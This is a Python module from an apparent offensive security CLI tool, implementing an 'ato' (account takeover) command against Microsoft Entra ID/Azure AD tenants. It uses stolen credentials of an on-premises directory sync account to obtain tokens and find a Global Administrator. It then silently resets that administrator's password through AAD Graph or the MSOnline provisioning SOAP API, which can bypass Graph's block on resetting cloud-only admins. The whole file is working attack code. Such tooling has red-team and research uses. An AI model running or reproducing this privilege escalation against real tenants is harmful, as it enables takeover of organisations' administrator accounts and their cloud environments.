import typer
import httpx
import re
import uuid
import secrets
import string
from base64 import b64encode
from xml.sax.saxutils import escape

from ._shared import azsync_app, console
from entruder.static import HTTP_TIMEOUT
from entruder.utils import handle_cli_errors, require_tenant, request_json, parse_error


def acquire_msol_token(tenant, username, password):
    
    url = f"https://autologon.microsoftonline.com/{tenant}/winauth/trust/2005/usernamemixed"

    body = f"""<?xml version='1.0' encoding='UTF-8'?>
    <s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope'
                xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd'
                xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy'
                xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd'
                xmlns:wsa='http://www.w3.org/2005/08/addressing'
                xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust'>
        <s:Header>
            <wsa:Action>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
            <wsa:To>https://autologon.microsoftonline.com/{tenant}/winauth/trust/2005/usernamemixed</wsa:To>
            <wsse:Security>
                <wsse:UsernameToken>
                    <wsse:Username>{escape(username)}</wsse:Username>
                    <wsse:Password>{escape(password)}</wsse:Password>
                </wsse:UsernameToken>
            </wsse:Security>
        </s:Header>
        <s:Body>
            <wst:RequestSecurityToken>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
            </wst:RequestSecurityToken>
        </s:Body>
    </s:Envelope>"""

    response = httpx.post(url, data=body,
                          headers={"Content-Type": "application/soap+xml; charset=utf-8"},
                          timeout=HTTP_TIMEOUT)
    if response.status_code != 200:
        raise ValueError(f"MSOL authentication failed: {response.status_code} {response.text}")

    assertion = re.search(
        r'<saml:Assertion\b[^>]*>(.*?)</saml:Assertion>',
        response.text,
        re.DOTALL,
    )

    if not assertion:
        error = re.search(r'<psf:text>(.*?)</psf:text>', response.text)
        if error:
            raise ValueError(f"Authentication error: {error.group(1)}")
        raise ValueError("SAML assertion not found in response, check credentials and tenant")

    # assertion.group(0) is already the full <saml:Assertion>...</saml:Assertion>
    # element; the token endpoint wants it base64 encoded verbatim.
    return b64encode(assertion.group(0).encode()).decode()


def exchange_saml_token(saml_token, tenant, client_id):
    result = request_json(
        "POST",
        f"https://login.microsoftonline.com/{tenant}/oauth2/token",
        data={
            "grant_type": "urn:ietf:params:oauth:grant-type:saml1_1-bearer",
            "client_id": client_id,
            "resource": "https://graph.windows.net/",
            "assertion": saml_token,
            "scope": "openid",
        },
    )
    token = result.get("access_token")
    if not token:
        message = result.get("error_description") or result.get("error") or str(result)
        raise ValueError(f"SAML token exchange failed: {parse_error(message)}")
    return token


# roleTemplateId of the built-in Global Administrator (a.k.a. Company
# Administrator) directory role — stable across every tenant.
GLOBAL_ADMIN_ROLE_TEMPLATE = "62e90394-69f5-4237-9190-012177145e10"


def discover_global_admin(token, tenant):
    headers = {"Authorization": f"Bearer {token}"}

    roles = request_json(
        "GET",
        f"https://graph.windows.net/{tenant}/directoryRoles",
        params={"api-version": "1.6"},
        headers=headers,
    )
    role_id = next(
        (r.get("objectId") for r in roles.get("value", [])
         if r.get("roleTemplateId") == GLOBAL_ADMIN_ROLE_TEMPLATE),
        None,
    )
    if not role_id:
        message = roles.get("error_description") or roles.get("error") or "Global Administrator role not activated in this tenant"
        raise ValueError(f"Could not resolve the Global Administrator role: {parse_error(str(message))}")

    members = request_json(
        "GET",
        f"https://graph.windows.net/{tenant}/directoryRoles/{role_id}/members",
        params={"api-version": "1.6"},
        headers=headers,
    )
    users = [m for m in members.get("value", []) if m.get("objectType") == "User" and m.get("objectId")]
    # prefer an enabled account so we don't waste the reset on a disabled one
    chosen = next((m for m in users if m.get("accountEnabled")), None) or (users[0] if users else None)
    if not chosen:
        raise ValueError("No user members found in the Global Administrator role")
    return chosen["objectId"], chosen.get("userPrincipalName")


def reset_user_password(token, tenant, target_id, new_password):
    response = httpx.patch(
        f"https://graph.windows.net/{tenant}/users/{target_id}",
        params={"api-version": "1.6"},
        json={"passwordProfile": {"password": new_password, "forceChangePasswordNextLogin": False}},
        headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
        timeout=HTTP_TIMEOUT,
    )
    # AAD Graph returns 204 No Content on a successful PATCH.
    if response.status_code not in (200, 204):
        raise ValueError(f"Password reset failed: HTTP {response.status_code} {response.text}")


def resolve_upn(token, tenant, object_id):
    if "@" in object_id:
        return object_id  # already a UPN
    result = request_json(
        "GET",
        f"https://graph.windows.net/{tenant}/users/{object_id}",
        params={"api-version": "1.6"},
        headers={"Authorization": f"Bearer {token}"},
    )
    upn = result.get("userPrincipalName")
    if not upn:
        message = result.get("error_description") or result.get("error") or f"UPN not found for {object_id}"
        raise ValueError(f"Could not resolve UPN: {parse_error(str(message))}")
    return upn


# The MSOnline provisioning SOAP API. Unlike Azure AD Graph, this path can reset
# a cloud-only admin's password, which is the classic MSOL/sync-account escalation
# that AAD Graph blocks. The envelope, header constants (ClientId/Version/
# BecVersion) and the ResetUserPasswordByUpn operation are ported verbatim from
# AADInternals' ProvisioningAPI_utils.ps1 (Create-Envelope) and Reset-UserPasswordByUpn.
PROVISIONING_URL = "https://provisioningapi.microsoftonline.com/provisioningwebservice.svc"


def _provisioning_envelope(token, command, request_elements, message_id):
    return f"""<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
    <s:Header>
        <a:Action s:mustUnderstand="1">http://provisioning.microsoftonline.com/IProvisioningWebService/{command}</a:Action>
        <a:MessageID>urn:uuid:{message_id}</a:MessageID>
        <a:ReplyTo>
            <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
        </a:ReplyTo>
        <UserIdentityHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
            <BearerToken xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Bearer {token}</BearerToken>
            <LiveToken i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService"/>
        </UserIdentityHeader>
        <ClientVersionHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
            <ClientId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">50afce61-c917-435b-8c6d-60aa5a8b8aa7</ClientId>
            <Version xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">1.2.183.81</Version>
        </ClientVersionHeader>
        <ContractVersionHeader xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
            <BecVersion xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Version47</BecVersion>
        </ContractVersionHeader>
        <a:To s:mustUnderstand="1">{PROVISIONING_URL}</a:To>
    </s:Header>
    <s:Body>
        <{command} xmlns="http://provisioning.microsoftonline.com/">
            <request xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
                <b:BecVersion>Version16</b:BecVersion>
                <b:TenantId i:nil="true"/>
                <b:VerifiedDomain i:nil="true"/>
                {request_elements}
            </request>
        </{command}>
    </s:Body>
</s:Envelope>"""


def reset_user_password_provisioning(token, target_upn, new_password):
    command = "ResetUserPasswordByUpn"
    request_elements = (
        "<b:ForceChangePasswordOnly>false</b:ForceChangePasswordOnly>"
        f"<b:UserPrincipalName>{escape(target_upn)}</b:UserPrincipalName>"
        "<b:ForceChangePassword>false</b:ForceChangePassword>"
        f"<b:NewPassword>{escape(new_password)}</b:NewPassword>"
    )
    envelope = _provisioning_envelope(token, command, request_elements, str(uuid.uuid4()))
    response = httpx.post(
        PROVISIONING_URL,
        content=envelope.encode("utf-8"),
        headers={"Content-Type": "application/soap+xml; charset=utf-8"},
        timeout=HTTP_TIMEOUT,
    )
    # The API answers 200 on success and a SOAP Fault (usually HTTP 500) on error.
    if response.status_code != 200 or "Fault>" in response.text:
        fault = re.search(r"<(?:\w+:)?Text[^>]*>(.*?)</(?:\w+:)?Text>", response.text, re.DOTALL)
        detail = fault.group(1).strip() if fault else f"HTTP {response.status_code}: {response.text[:300]}"
        raise ValueError(f"Provisioning password reset failed: {detail}")


def _generate_password(length=20):
    classes = [string.ascii_uppercase, string.ascii_lowercase, string.digits, "!@#$%^&*()-_"]
    chars = [secrets.choice(c) for c in classes]
    alphabet = "".join(classes)
    chars += [secrets.choice(alphabet) for _ in range(length - len(chars))]
    for i in range(len(chars) - 1, 0, -1):
        j = secrets.randbelow(i + 1)
        chars[i], chars[j] = chars[j], chars[i]
    return "".join(chars)




@azsync_app.command("ato")
@handle_cli_errors
def azsync_ato(
    tenant: str = typer.Option(..., "-tenant", help="Tenant ID (or domain) of the target directory"),
    username: str = typer.Option(..., "-username", help="UPN of the on-prem sync account (e.g. Sync_HOST_xxxx@tenant.onmicrosoft.com)"),
    password: str = typer.Option(..., "-password", help="Password of the sync account"),
    ga_id: str = typer.Option(None, "-ga-id", help="Object ID (or UPN) of the target account to take over (Optional, auto-discovers a Global Administrator if omitted)"),
    new_password: str = typer.Option(None , "-new-password", help="Password to set on the target (Optional, generated if omitted)"),
    provisioning: bool = typer.Option(False, "-provisioning", help="Reset via the MSOnline provisioning SOAP API instead of Azure AD Graph (needed to reset cloud-only Global Admins that AAD Graph blocks)"),
    client_id: str = typer.Option("1b730954-1685-4b74-9bfd-dabf81146b01", "-clientid", help="Client ID for the token exchange (Optional, defaults to the MSOnline client)"),
):
    """Take over a target account (e.g. a Global Admin) by abusing on-prem sync (MSOL) account credentials"""
    tenant = require_tenant(tenant, console)
    if not new_password:
        new_password = _generate_password()

    saml_token = acquire_msol_token(tenant, username, password)
    graph_token = exchange_saml_token(saml_token, tenant, client_id)
    console.print(f"[bold green][+][/] Authenticated as sync account {username}")

    ga_upn = None
    if not ga_id:
        ga_id, ga_upn = discover_global_admin(graph_token, tenant)
        label = f"{ga_upn} ({ga_id})" if ga_upn else ga_id
        console.print(f"[bold green][+][/] Auto-discovered Global Administrator: {label}")

    if provisioning:
        target_upn = ga_upn or resolve_upn(graph_token, tenant, ga_id)
        reset_user_password_provisioning(graph_token, target_upn, new_password)
        console.print(f"[bold green][+][/] Password for {target_upn} set to: {new_password}")
    else:
        reset_user_password(graph_token, tenant, ga_id, new_password)
        console.print(f"[bold green][+][/] Password for {ga_id} set to: {new_password}")
